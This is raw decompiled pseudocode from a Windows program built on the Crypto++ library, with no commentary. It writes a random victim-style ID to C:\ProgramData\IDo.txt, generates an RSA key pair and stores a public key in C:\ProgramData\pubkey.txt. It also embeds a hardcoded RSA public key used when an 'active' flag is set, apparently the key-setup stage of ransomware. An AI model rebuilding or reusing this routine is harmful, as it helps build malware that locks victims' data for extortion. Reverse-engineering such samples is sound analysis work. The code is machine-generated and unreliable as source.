    LOBYTE(v134) = 3;
    sub_40A6C0(v113);
    v99 = (void **)&v113[15];
    LOBYTE(v134) = 3;
    v113[15] = &CryptoPP::NameValuePairs::`vftable';
    v25 = v100;
  }
  else
  {
    LOBYTE(v101) = 0;
    v99 = (void **)v94;
    LOBYTE(v134) = 27;
    sub_427E80((int)v101, "C:\\ProgramData", 0xEu);
    v26 = v100 & 0xFFFFFFDF;
    v100 &= ~0x20u;
    LOBYTE(v134) = 28;
    v27 = !sub_404AA0((WCHAR *)v94);
    v128[0] = v27;
    LOBYTE(v134) = 3;
    if ( v98 >= 8 )
    {
      v28 = (void *)(2 * v98 + 2);
      v29 = (void *)v94[0];
      if ( (unsigned int)v28 >= 0x1000 )
      {
        v28 = (void *)(2 * v98 + 37);
        v29 = *(void **)(v94[0] - 4);
        if ( (unsigned int)(v94[0] - (_DWORD)v29 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v90 = v28;
      sub_46C87D(v29);
      v27 = v128[0];
    }
    v97 = 0;
    v98 = 7;
    LOWORD(v94[0]) = 0;
    if ( v27 )
    {
      sub_423460(v94, v89, (int)v90);
      LOBYTE(v134) = 30;
      v30 = (const WCHAR *)v94;
      if ( v98 >= 8 )
        v30 = (const WCHAR *)v94[0];
      directory = __std_fs_create_directory(v30);
      v126 = (void (__thiscall ***)(_DWORD, int))directory;
      if ( HIDWORD(directory) )
        sub_404980("create_directory", SHIDWORD(directory), (WCHAR *)v94, v91[0]);
      LOBYTE(v134) = 3;
      if ( v98 >= 8 )
      {
        v32 = (void *)(2 * v98 + 2);
        v33 = (void *)v94[0];
        if ( (unsigned int)v32 >= 0x1000 )
        {
          v32 = (void *)(2 * v98 + 37);
          v33 = *(void **)(v94[0] - 4);
          if ( (unsigned int)(v94[0] - (_DWORD)v33 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v90 = v32;
        sub_46C87D(v33);
      }
      v97 = 0;
      v98 = 7;
      LOWORD(v94[0]) = 0;
    }
    LOBYTE(v134) = 32;
    v126 = 0;
    v127 = 15;
    LOBYTE(v124[0]) = 0;
    sub_41EF80(v124, "0123456789QWERTYUIOPASDFGHJKLZXCVBNM", 0x24u);
    LOBYTE(v134) = 33;
    v34 = std::_Random_device();
    sub_417130(&v102, v34);
    v35 = v124;
    if ( v127 >= 0x10 )
      v35 = (void **)v124[0];
    v36 = (unsigned int)v126 + (_DWORD)v35;
    v37 = v124;
    if ( v127 >= 0x10 )
      v37 = (void **)v124[0];
    sub_423200((int)v37, v36);
    v38 = sub_419610(v124, (int)&v111[13], 0, 0xFu);
    v39 = v26 | 0x40;
    v100 = v39;
    LOBYTE(v134) = 32;
    if ( v127 >= 0x10 )
    {
      v40 = (void *)(v127 + 1);
      v41 = v124[0];
      if ( v127 + 1 >= 0x1000 )
      {
        v40 = (void *)(v127 + 36);
        v41 = (void *)*((_DWORD *)v124[0] - 1);
        if ( (unsigned int)(v124[0] - v41 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v90 = v40;
      sub_46C87D(v41);
    }
    v126 = 0;
    v127 = 15;
    LOBYTE(v124[0]) = 0;
    if ( &v122 != (__int128 *)v38 )
    {
      if ( HIDWORD(v123) >= 0x10 )
      {
        v42 = (void *)(HIDWORD(v123) + 1);
        v43 = (void *)v122;
        if ( (unsigned int)(HIDWORD(v123) + 1) >= 0x1000 )
        {
          v42 = (void *)(HIDWORD(v123) + 36);
          v43 = *(void **)(v122 - 4);
          if ( (unsigned int)(v122 - (_DWORD)v43 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v90 = v42;
        sub_46C87D(v43);
      }
      v123 = 0xF00000000i64;
      LOBYTE(v122) = 0;
      v122 = *(_OWORD *)v38;
      v123 = *(_QWORD *)(v38 + 16);
      *(_DWORD *)(v38 + 16) = 0;
      *(_DWORD *)(v38 + 20) = 15;
      *(_BYTE *)v38 = 0;
    }
    v44 = v39 & 0xFFFFFFBF;
    v100 = v44;
    LOBYTE(v134) = 3;
    if ( v111[18] >= 0x10u )
    {
      v45 = (void *)(v111[18] + 1);
      v46 = (void *)v111[13];
      if ( (unsigned int)(v111[18] + 1) >= 0x1000 )
      {
        v45 = (void *)(v111[18] + 36);
        v46 = *(void **)(v111[13] - 4);
        if ( (unsigned int)(v111[13] - (_DWORD)v46 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v90 = v45;
      sub_46C87D(v46);
    }
    v111[17] = 0;
    v111[18] = 15;
    LOBYTE(v111[13]) = 0;
    memset(&v105[2], 0, 0xB0u);
    sub_41B2C0(&v105[2], "C:\\ProgramData\\IDo.txt", v88, v89, (int)v90);
    LOBYTE(v134) = 34;
    v47 = &v122;
    if ( HIDWORD(v123) >= 0x10 )
      v47 = (__int128 *)v122;
    sub_426B10((int *)&v105[2], (int)v47, v123);
    sub_41B090(&v105[2]);
    memset(v106, 0, sizeof(v106));
    sub_462070(v106);
    LOBYTE(v134) = 35;
    v106[0] = &CryptoPP::AutoSeededRandomPool::`vftable';
    sub_457740(v106, 0, 0x20u);
    memset(v109, 0, sizeof(v109));
    v109[2] = (void (__thiscall **)(int, _DWORD, _DWORD *))dword_4CCF90;
    v109[18] = (void (__thiscall **)(int, _DWORD, _DWORD *))&unk_4CF4C4;
    v99 = (void **)&v109[65];
    v109[65] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::NameValuePairs::`vftable';
    LOBYTE(v134) = 38;
    v100 = v44 | 0x80;
    v109[1] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::X509PublicKey::`vftable';
    *(void (__thiscall ***)(int, _DWORD, _DWORD *))((char *)&v109[2] + dword_4CCF90[1]) = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::X509PublicKey::`vftable';
    v134 = 41;
    v109[0] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::RSAFunction::`vftable';
    v109[1] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::RSAFunction::`vftable';
    *(void (__thiscall ***)(int, _DWORD, _DWORD *))((char *)&v109[2] + (unsigned int)v109[2][1]) = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::RSAFunction::`vftable';
    sub_43D6C0(&v109[3]);
    LOBYTE(v134) = 42;
    sub_43D6C0(&v109[9]);
    v134 = 44;
    v99 = (void **)&v109[16];
    v109[16] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::PKCS8PrivateKey::`vftable';
    v109[17] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::PKCS8PrivateKey::`vftable';
    *(void (__thiscall ***)(int, _DWORD, _DWORD *))((char *)&v109[18] + (unsigned int)v109[18][1]) = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::PKCS8PrivateKey::`vftable';
    sub_45F0D0((int)&v109[19], 0);
    LOBYTE(v134) = 46;
    v109[0] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::InvertibleRSAFunction::`vftable';
    v109[1] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::InvertibleRSAFunction::`vftable';
    v109[15] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::InvertibleRSAFunction::`vftable';
    v109[16] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::InvertibleRSAFunction::`vftable';
    v109[17] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::InvertibleRSAFunction::`vftable';
    *(void (__thiscall ***)(int, _DWORD, _DWORD *))((char *)&v109[2] + (unsigned int)v109[2][1]) = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::InvertibleRSAFunction::`vftable';
    sub_43D6C0(&v109[29]);
    LOBYTE(v134) = 47;
    sub_43D6C0(&v109[35]);
    LOBYTE(v134) = 48;
    sub_43D6C0(&v109[41]);
    LOBYTE(v134) = 49;
    sub_43D6C0(&v109[47]);
    LOBYTE(v134) = 50;
    sub_43D6C0(&v109[53]);
    LOBYTE(v134) = 51;
    sub_43D6C0(&v109[59]);
    LOBYTE(v134) = 53;
    sub_43D500(v94, 0x11u);
    LOBYTE(v134) = 54;
    sub_450FA0(v109, (int)v106, (_DWORD *)0x800, v94);
    LOBYTE(v134) = 53;
    v48 = &v95;
    if ( v95 >= v96 )
      v48 = &v96;
    v50 = v97;
    v49 = *v48;
    memset(v97, 0, 4 * *v48);
    v90 = v50;
    if ( v49 )
      j_j_unknown_libname_61(v90);
    else
      j_j___free_base(v90);
    v120 = 0;
    v121 = 15;
    LOBYTE(v119[0]) = 0;
    LOBYTE(v134) = 56;
    memset(&v110[2], 0, 0x4Cu);
    v51 = (void **)operator new(0x10u);
    v99 = v51;
    LOBYTE(v134) = 57;
    *(_OWORD *)v51 = 0i64;
    sub_435E90(v51, 0);
    *v51 = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
    v51[1] = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
    v51[3] = v119;
    LOBYTE(v134) = 56;
    sub_408D50(&v110[2], (int)v51, v89, (int)v90);
    LOBYTE(v134) = 58;
    sub_433BB0((int *)&v109[16], (int)&v110[2]);
    (*(void (__thiscall **)(_DWORD *, _DWORD, _DWORD, int, int))(v110[2] + 24))(&v110[2], 0, 0, -1, 1);
    memset(v113, 0, sizeof(v113));
    v113[2] = dword_4CD254;
    v99 = (void **)&v113[15];
    v113[15] = &CryptoPP::NameValuePairs::`vftable';
    LOBYTE(v134) = 60;
    v25 = v100 | 0x200;
    v100 |= 0x200u;
    v113[1] = &CryptoPP::X509PublicKey::`vftable';
    *(_DWORD *)((char *)&v113[2] + dword_4CD254[1]) = &CryptoPP::X509PublicKey::`vftable';
    v134 = 61;
    v113[0] = &CryptoPP::RSAFunction::`vftable';
    v113[1] = &CryptoPP::RSAFunction::`vftable';
    *(_DWORD *)((char *)&v113[2] + *(_DWORD *)(v113[2] + 4)) = &CryptoPP::RSAFunction::`vftable';
    sub_43D420(&v113[3], &v109[3]);
    LOBYTE(v134) = 62;
    sub_43D420(&v113[9], &v109[9]);
    LOBYTE(v134) = 64;
    memset(v107, 0, 0x4Cu);
    v52 = (void **)operator new(0x10u);
    v99 = v52;
    LOBYTE(v134) = 65;
    *(_OWORD *)v52 = 0i64;
    sub_435E90(v52, 0);
    *v52 = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
    v52[1] = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
    v52[3] = v116;
    LOBYTE(v134) = 64;
    sub_408D50(v107, (int)v52, v85, v86);
    LOBYTE(v134) = 66;
    sub_433D80(&v113[1], (int)v107);
    (*(void (__thiscall **)(_DWORD *, _DWORD, _DWORD, int, int))(v107[0] + 24))(v107, 0, 0, -1, 1);
    memset(v108, 0, 0x4Cu);
    v53 = (void **)operator new(0x14u);
    v99 = v53;
    LOBYTE(v134) = 67;
    *(_OWORD *)v53 = 0i64;
    v53[4] = 0;
    v128[0] = 1;
    v101 = "C:\\ProgramData\\pubkey.txt";
    sub_435E90(v53, 0);
    *v53 = &CryptoPP::FileSink::`vftable';
    v53[1] = &CryptoPP::FileSink::`vftable';
    v53[3] = 0;
    LOBYTE(v134) = 68;
    v83 = v54;
    v55 = sub_4224C0(&v125, (int)"OutputFileName", &v101);
    LOBYTE(v134) = 69;
    v56 = sub_426840((int)v55, (int)"OutputBinaryMode", v128, *((_BYTE *)v55 + 8));
    sub_455DE0(v53, v56);
    LOBYTE(v134) = 70;
    if ( v126 )
      (**v126)(v126, 1);
    v125 = &CryptoPP::NameValuePairs::`vftable';
    LOBYTE(v134) = 66;
    sub_408D50(v108, (int)v53, v81, v82);
    LOBYTE(v134) = 72;
    sub_433D80(&v113[1], (int)v108);
    (*(void (__thiscall **)(_DWORD *, _DWORD, _DWORD, int, int))(v108[0] + 24))(v108, 0, 0, -1, 1);
    LOBYTE(v134) = 73;
    v99 = (void **)v76;
    sub_419BE0(v76, &a5);
    LOBYTE(v134) = 74;
    v101 = (const char *)v75;
    sub_419BE0(v75, &v122);
    LOBYTE(v134) = 75;
    v127 = (unsigned int)v74;
    sub_419BE0(v74, v119);
    LOBYTE(v134) = 73;
    sub_411FA0(
      a11,
      v74[0],
      (int)v74[1],
      (int)v74[2],
      (int)v74[3],
      (int)v74[4],
      (unsigned int)v74[5],
      v75[0],
      (int)v75[1],
      (int)v75[2],
      (int)v75[3],
      (int)v75[4],
      (unsigned int)v75[5],
      v76[0],
      (int)v76[1],
      v77,
      v78,
      v79,
      v80);
    LOBYTE(v134) = 77;
    if ( sub_4234F0(&v111[13], "active") )
    {
      sub_4233D0(v94, v79, v80);
      LOBYTE(v134) = 78;
      v57 = sub_404AA0((WCHAR *)v94);
      v128[0] = v57;
      LOBYTE(v134) = 77;
      if ( v98 >= 8 )
      {
        v58 = 2 * v98 + 2;
        v115 = v58;
        v59 = (void *)v94[0];
        if ( v58 >= 0x1000 )
        {
          v58 = 2 * v98 + 37;
          v115 = v58;
          v59 = *(void **)(v94[0] - 4);
          if ( (unsigned int)(v94[0] - (_DWORD)v59 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v80 = v58;
        sub_46C87D(v59);
        v57 = v128[0];
      }
      v97 = 0;
      v98 = 7;
      LOWORD(v94[0]) = 0;
      if ( v57 )
        remove("C:\\ProgramData\\pubkey.txt");
      sub_41EF80(
        v116,
        "MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAzA+0svdK/zcghzPRS7F+pPzCjAlygcNhQj/T5g7HigLegVH/Fi2dhjBDxjt9Ly3aPsHp"
        "Tb32ub2xb3gvv2VcBi4PVOClceG9Pq6M6HlUGYt1yhSRx8v+0CHX9Dg9rA/3SMhlqsVodtHtMbefPnPhto1/QY4FCcS3xGcC97Ja+oDkCVnkES8U"
        "1xeHno5kIlIWMulS5pjM6D3hss5yjUjIHiSr06QS4gCLX1ZijMo0wA3y6k9RUm9Me8MYiss/39RzsgGwDv5+DNxkLgSU25Sa2NZ8iG+Vufk/CkWe"
        "9CQj/SRCHm/mVQpNlfbthTTGh3OXy36pu46nYv3fS/ulkqHTaQIBEQ==",
        0x188u);
      memset(v104, 0, sizeof(v104));
      sub_41B2C0(v104, "C:\\ProgramData\\pubkey.txt", v78, v79, v80);
      LOBYTE(v134) = 80;
      v60 = v116;
      if ( v118 >= 0x10 )
        v60 = (void **)v116[0];
      sub_426B10((int *)v104, (int)v60, v117);
      sub_41B090(v104);
      memset(v103, 0, sizeof(v103));
      sub_41B470(v103, v61, v78, v79, v80);
      LOBYTE(v134) = 81;
      sub_426290(v103, (int)&v122);
      sub_41B400(v103);
      v93 = 1;
      LOBYTE(v134) = 80;
      sub_414850((char *)v103);
      LOBYTE(v134) = 77;
      sub_40A280((char *)v104);
    }
    LOBYTE(v134) = 73;
    if ( v111[18] >= 0x10u )
    {
      v62 = v111[18] + 1;
      v114 = v111[18] + 1;
      v63 = (void *)v111[13];
      if ( (unsigned int)(v111[18] + 1) >= 0x1000 )
      {
        v62 = v111[18] + 36;
        v114 = v111[18] + 36;
        v63 = *(void **)(v111[13] - 4);
        if ( (unsigned int)(v111[13] - (_DWORD)v63 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v80 = v62;
      sub_46C87D(v63);
    }
    v111[17] = 0;
    v111[18] = 15;
    LOBYTE(v111[13]) = 0;
    v134 = 72;
    sub_41EF80(v119, " ", 1u);
    v108[0] = &CryptoPP::ProxyFilter::`vftable';
    v108[1] = &CryptoPP::ProxyFilter::`vftable';
    LOBYTE(v134) = 86;
    if ( v108[18] )
      (**(void (__thiscall ***)(_DWORD, int))v108[18])(v108[18], 1);
    LOBYTE(v134) = 66;
    sub_406C70(v108);
    v107[0] = &CryptoPP::ProxyFilter::`vftable';
    v107[1] = &CryptoPP::ProxyFilter::`vftable';
    LOBYTE(v134) = 90;
    if ( v107[18] )
      (**(void (__thiscall ***)(_DWORD, int))v107[18])(v107[18], 1);
    LOBYTE(v134) = 64;
    sub_406C70(v107);
    LOBYTE(v134) = 58;
    sub_40A6C0(v113);
    v127 = (unsigned int)&v113[15];
    v113[15] = &CryptoPP::NameValuePairs::`vftable';
    v110[2] = &CryptoPP::ProxyFilter::`vftable';
    v110[3] = &CryptoPP::ProxyFilter::`vftable';
    LOBYTE(v134) = 95;
    if ( v110[20] )
      (**(void (__thiscall ***)(_DWORD, int))v110[20])(v110[20], 1);
    LOBYTE(v134) = 56;
    sub_406C70(&v110[2]);
    LOBYTE(v134) = 53;
    if ( v121 >= 0x10 )
    {
      v64 = v121 + 1;
      v65 = v119[0];
      if ( v121 + 1 >= 0x1000 )
      {
        v64 = v121 + 36;
        v65 = (void *)*((_DWORD *)v119[0] - 1);
        if ( (unsigned int)(v119[0] - v65 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v77 = v64;
      sub_46C87D(v65);
    }
    v120 = 0;
    v121 = 15;
    LOBYTE(v119[0]) = 0;
    LOBYTE(v134) = 36;
    sub_414B60(v109);
    v127 = (unsigned int)&v109[65];
    v109[65] = (void (__thiscall **)(int, _DWORD, _DWORD *))&CryptoPP::NameValuePairs::`vftable';
    v106[0] = &CryptoPP::AutoSeededRandomPool::`vftable';
    LOBYTE(v134) = 34;
    sub_4076F0((int)v106);
    LOBYTE(v134) = 3;
    sub_40A280((char *)&v105[2]);
  }
  v66 = v92;
  *(_QWORD *)v92 = 0i64;
  v66[2] = 0;
  sub_419BE0(&v111[7], v116);
  LOBYTE(v134) = 99;
  sub_419BE0(&v111[13], &v122);
  LOBYTE(v134) = 100;
  *v66 = 0;
  v66[1] = 0;
  v66[2] = 0;
  sub_423C30(v66, (char *)&v111[7], &v112, v127);
  v100 = v25 | 4;
  LOBYTE(v134) = 3;
  `eh vector destructor iterator'(&v111[7], 0x18u, 2u, (void (__thiscall *)(void *))sub_4199E0);
  LOBYTE(v134) = 2;
  if ( v118 >= 0x10 )
  {
    v67 = v118 + 1;
    v68 = v116[0];
    if ( v118 + 1 >= 0x1000 )
    {
      v67 = v118 + 36;
      v68 = (void *)*((_DWORD *)v116[0] - 1);
      if ( (unsigned int)(v116[0] - v68 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v83 = v67;
    sub_46C87D(v68);
  }
  v117 = 0;
  v118 = 15;
  LOBYTE(v116[0]) = 0;
  LOBYTE(v134) = 1;
  if ( HIDWORD(v123) >= 0x10 )
  {
    v69 = HIDWORD(v123) + 1;
    v70 = (void *)v122;
    if ( (unsigned int)(HIDWORD(v123) + 1) >= 0x1000 )
    {
      v69 = HIDWORD(v123) + 36;
      v70 = *(void **)(v122 - 4);
      if ( (unsigned int)(v122 - (_DWORD)v70 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v83 = v69;
    sub_46C87D(v70);
  }
  v123 = 0xF00000000i64;
  LOBYTE(v122) = 0;
  LOBYTE(v134) = 0;
  if ( a10 >= 0x10 )
  {
    v71 = a10 + 1;
    v72 = a5;
    if ( a10 + 1 >= 0x1000 )
    {
      v71 = a10 + 36;
      v72 = (_BYTE *)*((_DWORD *)a5 - 1);
      if ( (unsigned int)(a5 - v72 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v83 = v71;
    sub_46C87D(v72);
  }
  a9 = 0;
  a10 = 15;
  LOBYTE(a5) = 0;
  return v66;
}
// 413430: could not find valid save-restore pair for ebp
// 413430: could not find valid save-restore pair for edi
// 413430: could not find valid save-restore pair for esi
// 413776: variable 'v20' is possibly undefined
// 4138A2: variable 'v24' is possibly undefined
// 41416F: variable 'v54' is possibly undefined
// 4143A2: variable 'v61' is possibly undefined
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 469499: using guessed type __int64 __stdcall __std_fs_create_directory(LPCWSTR lpPathName);
// 46A5B8: using guessed type unsigned int __cdecl std::_Random_device();
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46C502: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *));
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA584: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';
// 4BA63C: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';
// 4BA8E0: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 4BA908: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 4BA938: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA968: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA970: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BB0C0: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB0E4: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB10C: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB13C: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB160: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB188: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB19C: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB1CC: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB1D4: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB914: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4BBA0C: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4CCF90: using guessed type _DWORD dword_4CCF90[2];
// 4CD254: using guessed type _DWORD dword_4CD254[2];
// 4CD3FC: using guessed type void *CryptoPP::FileSink::`vftable';
// 4CF2C8: using guessed type void *CryptoPP::Base64Decoder::`vftable';
// 4CF4D0: using guessed type void *CryptoPP::FileSource::`vftable';
// 4CF5A4: using guessed type void *CryptoPP::Base64Decoder::`vftable';
// 4CF684: using guessed type void *CryptoPP::FileSink::`vftable';
// 4CF8CC: using guessed type void *CryptoPP::FileSource::`vftable';
// 4CFA9C: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';

//----- (00414850) --------------------------------------------------------
void __thiscall sub_414850(char *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 112);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 112) = &std::ifstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 116) = *(_DWORD *)(*(_DWORD *)this + 4) - 112;
  sub_41C100((int)(this + 16));
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 28) + 4) - 112) = &std::istream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 28) + 4) - 116) = *(_DWORD *)(*((_DWORD *)v1 - 28) + 4) - 24;
  *(_DWORD *)v1 = &std::ios::`vftable';
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B8640: using guessed type void *std::istream::`vftable';
// 4BBF88: using guessed type void *std::ifstream::`vftable';

//----- (00414900) --------------------------------------------------------
_DWORD *__thiscall sub_414900(_DWORD *this, int a2)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax

  if ( a2 )
  {
    this[2] = dword_4CCF90;
    this[18] = &unk_4CF4C4;
    this[65] = &CryptoPP::NameValuePairs::`vftable';
  }
  v3 = this[2];
  this[1] = &CryptoPP::X509PublicKey::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v3 + 4) + 8) = &CryptoPP::X509PublicKey::`vftable';
  v4 = this[2];
  *this = &CryptoPP::RSAFunction::`vftable';
  this[1] = &CryptoPP::RSAFunction::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v4 + 4) + 8) = &CryptoPP::RSAFunction::`vftable';
  sub_43D6C0(this + 3);
  sub_43D6C0(this + 9);
  v5 = this[18];
  this[16] = &CryptoPP::PKCS8PrivateKey::`vftable';
  this[17] = &CryptoPP::PKCS8PrivateKey::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v5 + 4) + 72) = &CryptoPP::PKCS8PrivateKey::`vftable';
  sub_45F0D0((int)(this + 19), 0);
  v6 = this[2];
  *this = &CryptoPP::InvertibleRSAFunction::`vftable';
  this[1] = &CryptoPP::InvertibleRSAFunction::`vftable';
  this[15] = &CryptoPP::InvertibleRSAFunction::`vftable';
  this[16] = &CryptoPP::InvertibleRSAFunction::`vftable';
  this[17] = &CryptoPP::InvertibleRSAFunction::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v6 + 4) + 8) = &CryptoPP::InvertibleRSAFunction::`vftable';
  sub_43D6C0(this + 29);
  sub_43D6C0(this + 35);
  sub_43D6C0(this + 41);
  sub_43D6C0(this + 47);
  sub_43D6C0(this + 53);
  sub_43D6C0(this + 59);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA8E0: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 4BA908: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 4BA938: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA968: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA970: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BB0C0: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB0E4: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB10C: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB13C: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB160: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB188: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB19C: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB1CC: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4BB1D4: using guessed type void *CryptoPP::InvertibleRSAFunction::`vftable';
// 4CCF90: using guessed type _DWORD dword_4CCF90[2];

//----- (00414A90) --------------------------------------------------------
int __thiscall sub_414A90(_DWORD *this)
{
  int result; // eax

  result = sub_414B60(this);
  this[65] = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00414AF0) --------------------------------------------------------
_DWORD *__thiscall sub_414AF0(_DWORD *this, char a2)
{
  sub_414B60(this);
  this[65] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00414B60) --------------------------------------------------------
int __thiscall sub_414B60(_DWORD *this)
{
  _DWORD *v2; // ecx
  int v3; // edx
  int v4; // edx
  int v5; // edx
  int v6; // edx
  int v7; // edx
  int v8; // edx
  int v9; // eax
  void *v11; // [esp-4h] [ebp-28h]
  void *v12; // [esp-4h] [ebp-28h]
  void *v13; // [esp-4h] [ebp-28h]
  void *v14; // [esp-4h] [ebp-28h]
  void *v15; // [esp-4h] [ebp-28h]
  void *v16; // [esp-4h] [ebp-28h]

  v2 = this + 60;
  v11 = (void *)v2[3];
  v3 = *(_DWORD *)((char *)v2 + (v2[1] < v2[2] ? 0xFFFFFFFC : 0) + 8);
  memset(v11, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v11);
  else
    j_j___free_base(v11);
  v12 = (void *)this[57];
  v4 = *(_DWORD *)((char *)this + (this[55] < this[56] ? 0xFFFFFFFC : 0) + 224);
  memset(v12, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v12);
  else
    j_j___free_base(v12);
  v13 = (void *)this[51];
  v5 = *(_DWORD *)((char *)this + (this[49] < this[50] ? 0xFFFFFFFC : 0) + 200);
  memset(v13, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v13);
  else
    j_j___free_base(v13);
  v14 = (void *)this[45];
  v6 = *(_DWORD *)((char *)this + (this[43] < this[44] ? 0xFFFFFFFC : 0) + 176);
  memset(v14, 0, 4 * v6);
  if ( v6 )
    j_j_unknown_libname_61(v14);
  else
    j_j___free_base(v14);
  v15 = (void *)this[39];
  v7 = *(_DWORD *)((char *)this + (this[37] < this[38] ? 0xFFFFFFFC : 0) + 152);
  memset(v15, 0, 4 * v7);
  if ( v7 )
    j_j_unknown_libname_61(v15);
  else
    j_j___free_base(v15);
  v16 = (void *)this[33];
  v8 = *(_DWORD *)((char *)this + (this[31] < this[32] ? 0xFFFFFFFC : 0) + 128);
  memset(v16, 0, 4 * v8);
  if ( v8 )
    j_j_unknown_libname_61(v16);
  else
    j_j___free_base(v16);
  v9 = this[18];
  this[16] = &CryptoPP::PKCS8PrivateKey::`vftable';
  this[17] = &CryptoPP::PKCS8PrivateKey::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v9 + 4) + 72) = &CryptoPP::PKCS8PrivateKey::`vftable';
  boost::exception::~exception((boost::exception *)(this + 19));
  return sub_40A6C0(this);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);
// 4BA938: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
